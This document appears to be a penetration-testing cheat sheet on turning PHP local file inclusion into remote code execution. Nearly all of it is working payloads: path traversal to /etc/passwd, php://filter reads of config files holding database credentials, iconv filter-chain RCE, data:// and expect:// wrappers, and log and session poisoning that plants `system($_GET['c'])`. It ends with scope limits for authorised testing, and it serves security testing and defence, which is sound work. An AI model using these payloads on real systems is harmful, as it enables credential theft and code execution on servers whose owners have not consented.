# Local File Inclusion → RCE

A parameter that includes/reads a server path (`?page=`, `?file=`, `?template=`, `?lang=`). Read a file first, then climb toward code exec via wrappers or poisoning. PHP is the classic escalation target.

## Tier 1 — Basic read + traversal
```
/etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd        # nested, survives one strip
/etc/passwd%00                       # null byte (PHP <5.3.4 legacy)
../../../../etc/passwd%00.png        # null byte + expected extension (legacy)
php://filter/resource=/etc/passwd
```
(Full traversal/encoding bypass matrix in `../bypass-tables.md` and `path-traversal.md`.)

## Tier 2 — Source disclosure via php://filter
Read PHP source without executing it — grep the output for secrets/DB creds.
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/read=string.rot13/resource=index.php
```

## Tier 3 — filter-chain RCE (no upload needed)
Chain `iconv` conversions so php://filter *generates* a PHP payload from nothing — the modern LFI→RCE when no writable file exists. Generate the chain with a tool (php_filter_chain_generator), it looks like:
```
php://filter/convert.iconv.UTF8.CSISO2022KR|...long chain...|convert.base64-decode/resource=php://temp
```
Deliver as the include value; the decoded bytes become executed PHP (e.g. `<?=system($_GET[0]);?>`).

## Tier 3 — Wrappers: direct code
Requires `allow_url_include=On` (data/expect) — try them, they still appear.
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+     # <?php system('id');?>
data://text/plain,<?php system('id');?>
expect://id
php://input           # POST body becomes the PHP source; body = <?php system('id');?>
```

## Tier 3 — Log / environ / session poisoning
Write attacker-controlled PHP into a readable file, then include it.
```
# 1. Poison: send a request whose User-Agent (or referer) = <?php system($_GET['c']); ?>
# 2. Include the log:
/var/log/apache2/access.log&c=id
/var/log/nginx/access.log
/proc/self/environ            # older setups: poison via User-Agent
/var/lib/php/sessions/sess_<PHPSESSID>   # poison a session var, then include
/proc/self/fd/N               # brute-file-descriptor to catch the log
```
Also `.user.ini` / `.htaccess` with `auto_prepend_file` if you have any write primitive.

## Stop when
Read: one non-sensitive file (`/etc/hostname` or a config in base64 to prove source disclosure). RCE: one benign command (`id`) via filter-chain / wrapper / poisoning. Capture the request + the `id` output or the base64 config header proving disclosure. Do not read `/etc/shadow`, do not dump all source, do not persist a webshell — remove any poisoning artifact you can. Stop at single-command proof.
